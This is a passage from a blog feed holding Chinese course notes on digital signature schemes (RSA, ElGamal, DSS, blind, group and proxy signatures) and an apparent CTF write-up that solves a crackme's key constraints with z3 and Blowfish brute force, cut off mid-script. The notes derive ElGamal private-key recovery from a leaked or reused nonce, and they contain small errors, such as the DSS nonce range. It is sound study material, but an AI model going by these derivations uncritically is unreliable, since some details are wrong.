title="需满足条件"></a>需满足条件</h3><ul><li>必须相对容易生成该数字签名</li><li>必须相对容易识别和验证该数字签名</li><li><em>伪造</em> 该数字签名在 <em>计算上不可行</em> ，既包括对一个已有的数字签名构造新的消息，也包括对一个消息伪造一个数字签名</li></ul><h3 id="RSA签名算法"><a href="#RSA签名算法" class="headerlink" title="RSA签名算法"></a>RSA签名算法</h3><h4 id="RSA签名体制"><a href="#RSA签名体制" class="headerlink" title="RSA签名体制"></a>RSA签名体制</h4><ul><li>体制参数<ul><li>选两个保密的大素数 p 和 q，计算 $n &#x3D; p*q$ , $\varphi(n) &#x3D; (p-1)\cdot(q-1)$；</li><li>选一整数e，满足 $ 1&lt;e&lt;\varphi(n)$,且 $gcd(\varphi(n),e) &#x3D; 1$</li><li>计算 d，满足 $d \cdot e \equiv 1 \bmod \varphi(n)$;</li><li>以 $\lbrace e,n \rbrace$ 为公钥，$\lbrace d,n \rbrace$ 为私钥</li></ul></li></ul><h4 id="RSA公钥加密体制原理"><a href="#RSA公钥加密体制原理" class="headerlink" title="RSA公钥加密体制原理"></a>RSA公钥加密体制原理</h4><ul><li><p>密钥生成</p><ul><li>选择两个大素数 <em>p</em> 和 <em>q</em></li><li>计算 $ n &#x3D; p \cdot q , \varphi &#x3D; (p-1) \cdot (q-1)$</li><li>随机选取<em>e</em>，要求$ e &lt; n $，<em>e</em> 与 $ \varphi $ 没有公因数，即 <em>e</em> 与 $ \varphi $ 互质</li><li>选取 <em>d</em> 使得 $ ed  \equiv 1 \bmod \varphi(n) $</li><li>公钥是 $ (n,e) $，私钥是 $ (n,d) $</li></ul></li><li><p>签名</p><p>设消息为 $ m \in Z_n $，对其签名为 $$ S \equiv m^d \bmod n $$</p><p><em>S 即为签名</em></p></li><li><p>验证</p><p>接收方在收到消息 <em>m</em> 和签名 <em>s</em> 后，验证 $$ m \equiv s^e \bmod n $$ 是否成立，若成立，则发送方的签名有效</p></li><li><p>安全性： 大数分解的困难性</p><ul><li>如果RSA的模数 <em>n</em> 被成功分解为 $p*q$，则立即获得 $\varphi(n) &#x3D; (p-1) \cdot (q-1) $</li><li>从而能够确定 <em>e</em> 模 $ \varphi(n) $ 的乘法逆元 <em>d</em> ，</li><li>因此攻击成功</li></ul></li><li><p>正确性：</p><ul><li>因为 $ d \cdot e \equiv 1 \bmod \varphi (n) $</li><li>所以 $ s^e \equiv m^{d \cdot e} \equiv m^{1 + k \cdot \varphi (n)} \equiv m^1 \cdot m^{k \cdot \varphi (n)} \equiv m \bmod n $ </li><li>其中 k 为某个整数</li></ul></li></ul><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>$$ m \equiv S^e \bmod n $$</p><p>（1） 对任意消息 $ y \in Z_n $ ,任何人可以计算 $ x \equiv y^e \bmod n $,因此任何人可以伪造对随机消息 <em>x</em> 的签名</p><p>（2） 如果消息 $x_1$ 和 $x_2$ 的签名分别是 $y_1$ 和 $ y_2$ ，则知道 $x_1,x_2,y_1,y_2$的人可以伪造消息 $x_1 \cdot x_2$的签名$y_1 \cdot y_2 $的签名 </p><p>（3） 在RSA签名方案中，需签名的消息 $ x \in Z_n $，所以每次只能对 $ \lfloor \log_2n \rfloor $位长消息签名，<em>签名速度慢</em></p><p><em>克服缺陷的方法：签名之前先求消息的Hash值</em></p><h3 id="EIGamal-签名算法"><a href="#EIGamal-签名算法" class="headerlink" title="EIGamal 签名算法"></a>EIGamal 签名算法</h3><ul><li>1985年 EIGamal 提出了一个基于离散对数问题的签名方案，后来称为 EIGamal 数字签名方案</li><li>1991年该数字签名方案的变形被美国国家标准局（NIST）确定位数字签名标准（DSS）</li></ul><h4 id="EIGamal签名体制"><a href="#EIGamal签名体制" class="headerlink" title="EIGamal签名体制"></a>EIGamal签名体制</h4><ul><li>体制参数<ul><li>p：大素数</li><li>g：$Z^*_p $的一个生成元</li><li>x：用户A的密钥，$x \in Z^*_p$</li><li>y：用户A的公钥，$y \equiv g^x(\bmod p)$</li><li>K:  随机数，用于计算 $r &#x3D; g^k \bmod p$, $r$ 是签名之一</li></ul></li><li>参数要求：<ul><li><em>P</em> 应为150位以上的十进制数，500位以上的二进制数，<em>p-1</em> 应有大素数因子</li><li><em>K</em> 必须是保密而且必须是一次性的<ul><li><em>K</em> 泄露，则敌手可以计算 $ y^K $从而可以计算出 <em>M</em></li><li>使用同一 <em>K</em> 加密不同的明文 <em>M</em> ，<em>M’</em> ，如果敌手知道 <em>M</em> 就可以由 $ C_2 &#x2F; C_2^{‘} &#x3D; M &#x2F; M^{‘}$求出<em>M‘</em></li></ul></li></ul></li></ul><h4 id="EIGamal公钥加密体制原理"><a href="#EIGamal公钥加密体制原理" class="headerlink" title="EIGamal公钥加密体制原理"></a>EIGamal公钥加密体制原理</h4><ul><li><p>密钥生成</p><ul><li>选取大素数 <em>p</em> ，$g \in Z^*_n $ 是一个生成元， <em>p</em> 和 <em>g</em> 公开</li><li>随机选整数 $ x, 1 \leq x \leq p-2 $,计算 $ y &#x3D; g^x \bmod p $</li><li>公钥为 <em>y</em> ，私钥为 <em>x</em></li></ul></li><li><p>签名</p><p>对于消息 <em>m</em> ，首先随机选取整数 <em>k</em> ，$ 1 \leq k \leq p-2 $,然后计算 </p><p>$$ r &#x3D; g^k \bmod p, s &#x3D; (h(m) -x \cdot r) \cdot k^{-1} \bmod (p-1) $$</p><p>则 <em>m</em> 的签名为 $(r,s)$,其中 <em>h</em> 为 <em>Hash</em>函数</p></li><li><p>验证</p><p>接收方在收到消息 <em>m</em>  和 签名 $(r,s)$ 后，验证</p><p>$$ y^r \cdot r^s &#x3D; g^{h(m)} \bmod p$$</p><p>如果等式成立 ，则 $(r,s)$ 是消息 <em>m</em> 的有效签名，反之无效</p></li><li><p>正确性</p><ul><li><p>因为 $ s &#x3D; (h(m) - x \cdot r) \cdot k^{-1} \bmod (p-1)$</p></li><li><p>所以 $ s \cdot k + x \cdot r &#x3D; h(m) \bmod (p-1)$</p></li><li><p>所以  $ g^{h(m)} &#x3D; g^{(s \cdot k + x \cdot r)} &#x3D; g^{sk} \cdot g^{xr} &#x3D; y^r \cdot r^s \bmod p$</p></li><li><p>note: $y &#x3D; g^x \bmod p$ ,  $r &#x3D; g^k \bmod p$</p><p>​  如果消息 <em>m</em> 被篡改，则 <em>h(m)</em> 发生改变，从而 $y^r \cdot r^s \neq g^{h(m)} $ 起到验证作用</p></li></ul></li></ul><h4 id="讨论两问题"><a href="#讨论两问题" class="headerlink" title="讨论两问题"></a>讨论两问题</h4><p>  （1） 用EIGamal方案计算一个签名时，使用的随机数 <em>K</em> 能不能被泄露</p><p>  （2） 若Bob使用相同的 <em>K</em> 的值来签名不同的两份消息， Oscar能否攻破这个体制</p><p>Answer1:</p><ul><li>由于私钥 <em>x</em> 是保密的，所以如果攻击者想要得到这个密钥，必须求解离散对数问题 $\log_gy$ ,这是一个困难问题。但是随机数 <em>K</em> 泄露，则可解 $ x &#x3D; (h(m) - sk)r^{-1} \bmod (p-1)$ 得到 <em>x</em>，方案被攻破</li><li>note：为什么 <em>K</em> 泄露方案会被攻破呢<ul><li>先看看公开参数有什么 <ul><li>大素数 <em>P</em></li><li>生成元 <em>g</em></li><li>公钥 <em>y</em> ，<em>y</em> 由 $ y&#x3D; g^x \bmod p$ 得到</li><li>签名一 <em>r</em> ，<em>r</em> 由 $r&#x3D;g^k \bmod p$ 得到</li><li>签名二 <em>s</em> , <em>s</em> 由 $s &#x3D; (h(m) -x \cdot r) \cdot k^{-1} \bmod (p-1)$ 得到</li></ul></li><li>现在假设我们是中间人，我们可以获得这些消息，并想篡改消息 <em>m</em>，但是一旦篡改消息 <em>m</em>，会导致 <em>h(m)</em> 发生改变，从而导致 $$y^r \cdot r^s \neq g^{h(m)} $$ ，接收者就知道消息已被篡改。因此想要不被发现，必须连带着把 <em>r</em> ,<em>s</em> 也一起改变，即重新计算  $$s &#x3D; (h(m) -x \cdot r) \cdot k^{-1} \bmod (p-1) $$ ，得到 $s’$ ,并发送篡改后的签名 $(r,s’)$，这样接收方就无法判断消息是否被篡改</li><li>所以现在的问题是，如何计算 $s’$ ? 看看 <em>s</em> 的生成式，我们必须知道 <em>x</em> 和 <em>k</em> 才能计算 <em>s</em> </li><li>我们手上现在跟 <em>K</em> 相关的式子只有两条 $r&#x3D;g^k \bmod p$ 和 $s &#x3D; (h(m) -x \cdot r) \cdot k^{-1} \bmod (p-1)$ ，显然我们应该用前面那一条式子，因为后面的式子有两个未知数</li><li>那就来看看第一个式子吧， 我们现在知道 $r, g, p$，需要求 <em>g</em> 的几次方模 <em>p</em> 等于 <em>r</em> ，然而这是个很困难的问题，也就是离散对数问题，EIGamal的安全性就基于此。</li><li>一旦 <em>K</em> 泄露，就可以计算出 <em>x</em> ，整个消息就可以被篡改并进行重新签名得到 $s’$</li></ul></li></ul><p>Answer2:</p><ul><li><p>不可用同一个 <em>K</em> 做两次签名。若Bob利用相同 <em>K</em> 签名两次，即签名分别为 $(r,s_1)$ ,$(r,s_2)$ ,则Oscar可以联立方程 </p><p>$$<br>\begin{cases}<br>h(m1) &#x3D; xr +ks_1 \bmod (p-1) \newline h(m2) &#x3D; xr +ks_2 \bmod (p-1)<br>\end{cases}<br>$$</p><p>可得： $ x &#x3D; [h(m_1)s_2 - h(m_2)s_1] (s_2 - s_1) ^{-1} r^{-1} \bmod (p-1) $</p></li><li><p>note： 上式乘 $s_2$, 下式乘 $s_1$ 即可</p></li></ul><p>​  </p><h3 id="DSS签名算法"><a href="#DSS签名算法" class="headerlink" title="DSS签名算法"></a>DSS签名算法</h3><p>数字签名标准DSS(Digital Signature Standard)是由美国NIST公布的联邦信息处理标准FIPS PUB 186，最初于1991年公布，在考虑了公众归队其安全性的反馈意见后，于1993年公布了其修改版</p><ul><li><p>DSS的基本方式</p><p>首先将DSS与RSA的签名方式做一比较。RSA算法既能用于加密和签名，又能用于密钥交换。与此不同，DSS使用的算法只能提供数字签名功能。下图是比较</p></li></ul><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305311621956.png" alt="1"></p><h4 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h4><ul><li><p>设 $512 \leq L \leq 1024$ 且 $L$ 是64的倍数，选取 $2^{L-1} &lt; p &lt;2^L$ 大素数，其满足存在160比特的素数$q|p-1$</p></li><li><p>随机选取整数 $h$ ,$ 1 &lt; h &lt;p-1 $ ,且使 $ g &#x3D; h^{(p-1) &#x2F;q} \bmod p $ , $p,g$ 公开 </p></li><li><p>随机选取整数 $x$ , $1 \leq x \leq q-1 $ , 计算 $ y &#x3D; g^x \bmod p $</p></li><li><p>公钥为 $y$, 私钥为 $x$</p></li></ul><h4 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h4><ul><li>对于消息 <em>m</em> ，首先随机选取一个整数 <em>k</em>，$1 \leq k \leq p-2 $ ,然后计算<br>$$ {left}<br>\begin{align}<br>&amp;r &#x3D; (g^k \bmod p ) \bmod q \<br>&amp;s &#x3D; (h(m) + xr) K^{-1} \bmod q<br>\end{align}<br>$$<br>则 <em>m</em> 的签名为 $(r,s$) ,其中 <em>h</em> 为Hash函数SHA</li></ul><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><ul><li><p>接收方收到消息 <em>m</em> 和 签名 $(r,s$)，后计算<br>$$<br>\begin{align}<br>u_1 &amp;&#x3D; h(m) s^{-1} \bmod q \newline<br>u_2 &amp;&#x3D; rs^{-1} \bmod q<br>\end{align}<br>$$</p></li><li><p>验证等式<br>$$<br>(g^{u_1}y^{u_2} \bmod p) \bmod q &#x3D;r<br>$$</p></li><li><p>如果等式成立，则$(r,s)$ 消息 <em>m</em> 的有效签名</p></li></ul><h4 id="正确性"><a href="#正确性" class="headerlink" title="正确性"></a>正确性</h4><ul><li><p>因为 $u_1 + xu_2 \bmod q &#x3D; (h(m) + xr)s^{-1} \bmod q &#x3D; k$</p></li><li><p>所以<br>$$<br>\begin{align}<br>g^{u_1}y^{u_2} \bmod p \bmod q &amp;&#x3D; g^{u_1+ xu_2} \bmod p \bmod q \newline<br>&amp;&#x3D; g^k \bmod p \bmod q \newline<br>&amp;&#x3D;r<br>\end{align}<br>$$</p></li></ul><h2 id="特殊性质的签名算法"><a href="#特殊性质的签名算法" class="headerlink" title="特殊性质的签名算法"></a>特殊性质的签名算法</h2><h3 id="盲签名"><a href="#盲签名" class="headerlink" title="盲签名"></a>盲签名</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul><li>盲签名方案是在发送者 <em>A</em> 和发送者 <em>B</em> 之间的双方协议。其基本思想如下：<ul><li><em>A</em> 发送给 <em>B</em> 一段消息，<em>B</em> 对它签名并送回 <em>A</em> </li><li>从这个签名 <em>A</em> 能够计算 <em>B</em> 关于 <em>A</em> 预先所选消息 <em>m</em> 的签名</li><li>协议完成时 <em>B</em> 既不知道消息 <em>m</em> 也不知道消息的签名</li></ul></li><li>盲签名的目的是防止 <em>B</em> 看到消息和签名，从而使 <em>B</em> 以后不能将所签消息和发送者 <em>A</em> 联系起来</li></ul><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><ul><li>发送者 <em>A</em>（客户）不希望签名者 <em>B</em>（银行）能够将一条先验消息 <em>m</em> 及其签名 $S_B(m)$ 与协议的特定实例相联系</li><li>这个特性在电子现金应用中可能很重要，因为那里的消息也许表示 <em>A</em> 所花的金钱数额</li><li>当 <em>m</em> 和 $S_B(m)$ 提交给 <em>B</em> 进行支付时， <em>B</em> 无法推断原先接收签名的是谁。这就是允许 <em>A</em> 的匿名性，从而 <em>A</em> 的消费模式不能被监测</li></ul><h4 id="所需组件"><a href="#所需组件" class="headerlink" title="所需组件"></a>所需组件</h4><ul><li>签名者 <em>B</em> 的一种数字签名机制，用 $S_B(x)$ 记 <em>B</em> 对 <em>x</em> 签名</li><li>函数 $f$ 和 $g$ （只有发送者知道），满足$g(S_B(f(m))) &#x3D; S_B(m)$ 。其中 $f$ 叫盲化函数，$g$ 叫去盲函数，$f(m)$ 叫做盲消息。此条对 $S_B$ 和 $g$ 的选择加了许多限制</li></ul><h4 id="Chaum-盲签名协议"><a href="#Chaum-盲签名协议" class="headerlink" title="Chaum 盲签名协议"></a>Chaum 盲签名协议</h4><ul><li>摘要：发送者 <em>A</em> 接收 <em>B</em> 关于盲消息的签名。由此 <em>A</em> 计算 <em>B</em> 关于 <em>A</em> 预先所选消息 <em>m</em> 的签名，$0 \leq m \leq n-1 $ 。<em>B</em> 既没有消息 <em>m</em> 也没有 <em>m</em> 相关签名的知识<ul><li><em>B</em> 的RSA公钥和私钥分别是 $(n,e)$ 和 $d$ 。<em>k</em> 是 <em>A</em> 随机选择秘密数，满足 $ 0 \leq k \leq n-1$ 且 $gcd(n,k) &#x3D;1 $ </li><li>协议步骤<ul><li>（盲化） <em>A</em> 计算 $m^* &#x3D; mk^e \bmod n$</li><li>（签名） <em>B</em> 计算 $s^* &#x3D; (m^*) ^d \bmod n $</li><li>（去盲） <em>A</em> 计算 $s&#x3D;k^{-1} s^* \bmod n$</li></ul></li></ul></li><li>正确性<ul><li>显然 <em>s</em> 是 <em>m</em> 的签名 ，即 $s&#x3D;m^d \bmod n$</li><li><em>B</em> 既没有消息 <em>m</em> 也没有 <em>m</em> 相关签名 <em>s</em> 的知识</li></ul></li></ul><h4 id="不可追踪电子现金"><a href="#不可追踪电子现金" class="headerlink" title="不可追踪电子现金"></a>不可追踪电子现金</h4><ul><li><p>Chaum, Fiat, 和Naor提出一个不可追踪电子现金方案。 </p><ul><li>加入者A获取来自银行的电子现金货币 – A可以将此货币在商店B花掉，而B无需与银行在线验证货币的真实性。 – 当B在银行将电子货币兑现时，银行不能将其与A联系起来。 </li><li>如果A企图以该货币花两次（重复消费），那么A的身份就会暴露。</li></ul></li><li><p>Okamoto提出一种可分电子现金方案。可分电子硬币是一个 与金钱数值关联的元素，可用来进行多次电子买卖，前提是 所有交易的金钱总额不超过硬币数额</p></li></ul><h3 id="不可否认签名"><a href="#不可否认签名" class="headerlink" title="不可否认签名"></a>不可否认签名</h3><h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><ul><li>不可否认的数字签名由 CHaum 和 van Antwerpen 在1989年提出</li><li>不可否认签名没有签名者的合作，接收者无法验证签名</li></ul><h4 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h4><ul><li>实体 <em>A</em>（客户）希望访问被实体 <em>B</em>（银行）控制的某个安全区域。比如该安全区域可能是存放保险箱的房间。在许可访问之前，<em>B</em> 要求 <em>A</em> 签署一份时间和日期的文件。如果 <em>A</em> 采用了不可否认签名，那么在验证过程中没有 <em>A</em> 的直接参与， （在以后的日期）<em>B</em> 就不能向任何人证明 <em>A</em> 使用过安全区域中的设施</li><li>假定某大公司 <em>A</em> 制作了一个软件包。<em>A</em> 对软件包签名并将它卖给实体 <em>B</em>，而 <em>B</em> 决定将其拷贝再卖给第三方<em>C</em>，那么没有 <em>A</em> 的合作 <em>C</em> 就无法验证该软件是否正版<ul><li>当然，这种措施并 <em>不能阻止</em> <em>B</em> 用它自己的签名重新签署软件包，但因此 <em>B</em> 也就 <em>无法利用</em> 与 <em>A</em> 名气相关的市场利益。而且 <em>追踪</em>  <em>B</em> 的欺诈行为也将很 <em>容易</em></li></ul></li></ul><h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h4><ul><li>一个不可否认签名方案有三部分组成：</li><li>签名算法</li><li>验证协议</li><li>否认协议</li></ul><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li>签名者可以声称一个签名是伪造的，在这种情况下，如果 <em>签名者拒绝</em> 参加验证，就可认为签名者有欺骗行为。如果签名者 <em>参加</em> 验证，由否认协议就可推断出签名的 <em>真伪</em> 。 </li><li>否认协议需要做到以下两点 </li><li>B能使A相信一个不合法的签名是伪造的。</li><li>B以很小的概率使A相信一个合法签名是伪造的</li><li>不可否认签名的一个 <em>不足之处</em> 是签名者有可能不在场或者拒绝合作，而导致签名无法被接收者验证。 <ul><li>Chaum提出“指定验证者签名”的概念，其中签名者指定某 实体作为签名的验证者。 </li><li>一旦签名者不在场或者拒绝合作，验证者就有权力与接收 者交互来检查签名。</li><li>验证者不能产生签名者的签名</li></ul></li></ul><h3 id="群签名"><a href="#群签名" class="headerlink" title="群签名"></a>群签名</h3><h4 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h4><ul><li>1991年，Chaum和Van Heijst提出群签名方案。 </li><li>该方案允许群众的某个成员以群的名义匿名地签发消息。满足下述三个条件：<ul><li><em>只有</em> 群中的成员才能代表群进行签名；</li><li>签名的接收者 <em>能验证</em> 签名是哪一个群的一个合法签名，但 <em>不能分辨</em> 具体的签名者。 </li><li>一旦出现争端，可借助群成员或一个可信的机构能 <em>识别出签名者</em></li></ul></li></ul><h4 id="应用-2"><a href="#应用-2" class="headerlink" title="应用"></a>应用</h4><ul><li>一个公司有几台计算机，每台都联在局域网上。公司的 <em>每个部门</em> 有其自己的打印机（也连在局域网上），并且 <em>只有本部门</em> 的人员才能允许使用其部门的打印机。因此，打印前必须 <em>确认</em> 用户在哪个部门工作。同时公司为了保密，<em>不可以暴露用户的身份</em>。然而，如果有人 <em>滥用</em> 打印机，主管者必须能 <em>找出</em> 是谁在滥用打印机</li></ul><h4 id="组成-1"><a href="#组成-1" class="headerlink" title="组成"></a>组成</h4><p>（1）建立（setup） 一个用以产生群公钥和私钥的多项式概率算法。</p><p>（2）加入（join） 一个用户和群管理员之间的交互式协议。执行该协议可以使用户成为群成员，群管理员得到群成员的秘密的成员管理密钥，并产生群成员的私钥和成员证书。 </p><p>（3）签名（sign） 一个概率算法，当输入一个消息、一个群成员 的私钥和一个群公钥后，输出对该消息的签名。 </p><p>（4）验证（verify） 给定一个消息的签名和一个群公钥后，判断该签名相对于该群公钥是否有效。 </p><p>（5）打开（open） 给定一个签名、群公钥和群私钥的条件下确定 签名者的身份</p><h4 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h4><p>① 正确性（correctness）</p><p>② 不可伪造性（unforgeability）  </p><p>③ 匿名性（anonymity）  </p><p>④ 不可关联性（unlinkability）  </p><p>⑤ 可跟踪性（traceability） </p><p>⑥ 可开脱性（exculpability）  </p><p>⑦ 抗联合攻击（coalition-resistance）</p><h3 id="代理签名"><a href="#代理签名" class="headerlink" title="代理签名"></a>代理签名</h3><p>&lt;TODO：概念&gt; (他PPT也妹给啊)</p><h4 id="组成-2"><a href="#组成-2" class="headerlink" title="组成"></a>组成</h4><ul><li>系统建立  选定代理签名方案的系统参数，用户的密钥等</li><li>签名权力的委托  原始签名者将自己的签名权力委托给代理签名 者</li><li>代理签名的产生  代理签名者代表原始签名者产生代理签名</li><li>代理签名的验证 验证人验证代理签名的有效性。</li></ul><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>根据签名权力委托的方式不同，代理签名可以分为以下几类： </p><p>（1）完全代理（full delegation）  </p><p>（2）部分代理（partial delegation） </p><p>（3）具有证书的代理（delegation by warrant） </p><p>（4）具有证书的部分代理（partial delegation with warrant）</p><p>根据原始签名者能否产生同代理签名者一样的签名，代理签名又 可分为两类： </p><p>（1）代理非保护（proxy-unprotected） 原始签名者能够产生有效的 代理签名。 </p><p>（2）代理保护（proxy-protected） 原始签名者不能够产生有效的代 理签名</p><h4 id="强代理方案满足性质："><a href="#强代理方案满足性质：" class="headerlink" title="强代理方案满足性质："></a>强代理方案满足性质：</h4><p>① 可区分性（distinguishability）</p><p>② 可验证性（verifiability） </p><p>③ 强不可伪造性（strong unforgeability）  </p><p>④ 强可识别性（strong identifiability）  </p><p>⑤ 强不可否认性（strong undeniability） ⑥ 防止滥用（prevention of misuse）</p>]]></content>
    
    
    <categories>
      
      <category>SYSU</category>
      
      <category>Crypt</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WhiteHat CTF 2015 Crypto400</title>
    <link href="/2023/05/30/WhiteHat%20CTF%202015%20Crypto400/"/>
    <url>/2023/05/30/WhiteHat%20CTF%202015%20Crypto400/</url>
    
    <content type="html"><![CDATA[<p>这是一道re</p><span id="more"></span><p>这题原本是angr官方文档的题目，用来让熟悉angr使用方式，但是由于种种原因，angr脚本并不能跑起来，遂转用传统做法，</p><p>也在此中完善了对z3的认识。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>题目很简单</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305302154505.png" alt="2023-05"></p><p>可以先使用finger恢复符号表。恢复完后程序的逻辑就会更为明显，首先是通过命令行传参，丢给<code>sub_40166A</code>进行初步的判断，然后再将参数当作密钥对BlowFish的P盒以及S盒变换，然后在解密<code>qword_6C10E01</code>,再比对结果。</p><p>所以这题的关键就在与传的参数，参数对了，这个解密才能正确</p><p>先来看看第一步判断<code>sub_40166A</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305302159129.png" alt="2.png"></p><p>很简单明了的约束条件,首先密钥长度为8，然后每一位密钥之间应该满足如下关系</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">byte_6C4B20</span> * byte_6C4B21 == <span class="hljs-number">13310</span><br><span class="hljs-attribute">byte_6C4B22</span> + byte_6C4B23 == <span class="hljs-number">185</span><br><span class="hljs-attribute">byte_6C4B24</span> != (byte_6C4B25 == <span class="hljs-number">53</span>)<br><span class="hljs-attribute">byte_6C4B26</span> - byte_6C4B27 == -<span class="hljs-number">19</span><br><span class="hljs-attribute">byte_6C4B20</span> + byte_6C4B27 == <span class="hljs-number">195</span><br><span class="hljs-attribute">byte_6C4B24</span> != (byte_6C4B21 == <span class="hljs-number">24</span>)<br><span class="hljs-attribute">byte_6C4B22</span> | (byte_6C4B27 == <span class="hljs-number">117</span>)<br><span class="hljs-attribute">byte_6C4B20</span> * byte_6C4B25 == <span class="hljs-number">9240</span><br></code></pre></td></tr></table></figure><p>但细心一点会发现，这里虽然有8行表达式，但其中有两行是无效的，即<code>byte_6C4B24 != (byte_6C4B25 == 53)</code>和<code>byte_6C4B22 | (byte_6C4B27 == 117)</code>，这两行并不能起到约束效果。也就是说有八个未知数，但只有六个约束条件，这就决定了能通过第一步的参数不止一个。</p><p>于是乎很自然的想到可以使用z3求解器帮助我们过掉第一步的筛选，再进一步判断。</p><p>当我们过掉一步的判断后，紧接这就是<code>BlowInit</code>和<code>Blowdec</code>，这两个函数就是BlowFish的标准初始化函数和解密函数，那么我们就可以使用z3求解出来的值来进一步爆破。</p><p>note：需要把z3求解出来的值，转化为python的int型，才能去索引列表，脚本中会有详细注释</p><p>note2：脚本中Blow_BOX 存放提取出来的S盒 P盒，此题目的S盒、P盒与传统的值不相同</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> copy<br><span class="hljs-keyword">from</span> Blow_BOX <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 存储P盒以及S盒，因为每次爆破一次key P盒和S盒都会变化，下一次爆破需要复原</span><br><span class="hljs-comment"># 这个地方需要使用此复制 即创建两个独立的P盒 S盒 不可简单用等于号 否则会一起变化</span><br>P_temp = copy.deepcopy(p_box)<br>S_temp = copy.deepcopy(s_box)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_key_pbox</span>(<span 